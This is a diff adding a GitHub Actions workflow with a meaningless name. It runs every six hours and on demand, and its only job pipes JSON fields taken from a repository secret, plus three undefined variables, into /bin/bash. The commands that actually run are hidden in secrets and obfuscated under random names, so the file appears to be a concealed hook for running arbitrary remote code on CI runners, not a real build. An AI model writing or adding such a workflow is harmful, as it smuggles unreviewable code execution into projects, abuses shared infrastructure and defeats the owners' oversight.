@@ -1,0 +1,20 @@
+name: stronglyreiterate
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: stronglyreiterate
+        env:
+          ip18: ${{ secrets.ip18 }}
+        run: |
+          echo $ip18 | jq -r .gpfkz3 | /bin/bash
+          echo $w5514 | jq -r .teyk32 | /bin/bash
+          echo $z02441 | jq -r .si189 | /bin/bash
+          echo $xtkf879 | jq -r .ztj8445 | /bin/bash
+
